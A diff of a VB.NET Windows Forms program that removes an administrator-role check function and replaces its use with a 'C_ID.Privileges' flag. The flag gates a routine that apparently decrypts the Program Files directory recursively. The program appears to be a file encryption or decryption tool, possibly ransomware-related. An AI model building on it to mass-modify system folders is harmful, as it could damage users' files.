@@ -134,21 +134,6 @@ Public Class Form1
         End Try
     End Sub
 
-    Public Function AmiAdmin()
-        Try
-            Dim id As Security.Principal.WindowsIdentity = Security.Principal.WindowsIdentity.GetCurrent()
-            Dim p As Security.Principal.WindowsPrincipal = New Security.Principal.WindowsPrincipal(id)
-            If p.IsInRole(Security.Principal.WindowsBuiltInRole.Administrator) Then
-                Return True
-            Else
-                Return False
-            End If
-        Catch ex As Exception
-            Return False
-        End Try
-    End Function
-
-
     Private Sub txtFiles_TextChanged(sender As Object, e As EventArgs) Handles txtFiles.TextChanged
         On Error Resume Next
         txtFiles.Text.Trim()
@@ -182,7 +167,7 @@ Public Class Form1
 
     Private Sub BackgroundWorker3_DoWork(sender As Object, e As DoWorkEventArgs) Handles BackgroundWorker3.DoWork
         On Error Resume Next
-        If AmiAdmin() = True Then
+        If C_ID.Privileges = True Then
             Dir_Dec(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\", P1)
         End If
         Finished += 1
